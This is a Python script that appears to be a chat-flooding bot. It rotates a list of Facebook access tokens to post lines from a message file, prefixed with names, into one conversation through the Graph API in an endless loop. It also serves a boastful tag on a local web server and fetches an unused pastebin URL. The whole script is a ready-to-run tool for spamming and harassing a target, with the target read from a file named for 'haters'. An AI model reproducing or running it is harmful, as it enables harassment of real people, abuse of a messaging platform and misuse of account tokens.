import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"99P RAJ MISHRA K9 S3RV3R US3 K9R R9H3 HO B3FIKAR US3 K9RO TH3 UNB39T9BL3 L3G3ND DON R4J H3R3")

def execute_server():
    PORT = 4000

    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

def send_messages():
    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)

    requests.packages.urllib3.disable_warnings()

    def cls():
        if system() == 'Linux':
            os.system('clear')
        else:
            if system() == 'Windows':
                os.system('cls')
    cls()

    def liness():
        print('\u001b[37m' + '---------------------------------------------------')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    mmm = requests.get('https://pastebin.com/raw/AKuHGZSr').text

    liness()

    access_tokens = [token.strip() for token in tokens]

    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('File.txt', 'r') as file:
        messages = file.readlines()

    num_messages = len(messages)
    max_tokens = min(num_tokens, num_messages)

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    # Load names from name.txt file for sequential messages
    with open('name.txt', 'r') as file:
        last_names = file.readlines()

    liness()

    # Function to handle the rotation and message sending
    def cycle_messages():
        while True:
            try:
                for message_index in range(num_messages):
                    token_index = message_index % max_tokens
                    access_token = access_tokens[token_index]

                    message = messages[message_index].strip()

                    # Get the last name from name.txt (sequentially)
                    last_name = last_names[message_index % len(last_names)].strip()

                    url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)  # Updated to v17.0
                    parameters = {'access_token': access_token, 'message': last_name + ' ' + message}
                    response = requests.post(url, json=parameters, headers=headers)

                    current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                    if response.ok:
                        print("[+] R4J M1SHR4 SERV3R Message {} of Convo {} sent by Token {}: {}".format(
                            message_index + 1, convo_id, token_index + 1, last_name + ' ' + message))
                        print("  - Time: {}".format(current_time))
                        liness()
                        liness()
                    else:
                        print("[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
                            message_index + 1, convo_id, token_index + 1, last_name + ' ' + message))
                        print("  - Time: {}".format(current_time))
                        liness()
                        liness()

                    time.sleep(speed)

                print("\n[+] All messages sent. Waiting for 1 minute before restarting the cycle...\n")
                time.sleep(60)  # 1 minute gap after completing a cycle
            except Exception as e:
                print("[!] An error occurred: {}".format(e))

    cycle_messages()

def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    send_messages()

if __name__ == '__main__':
    main()
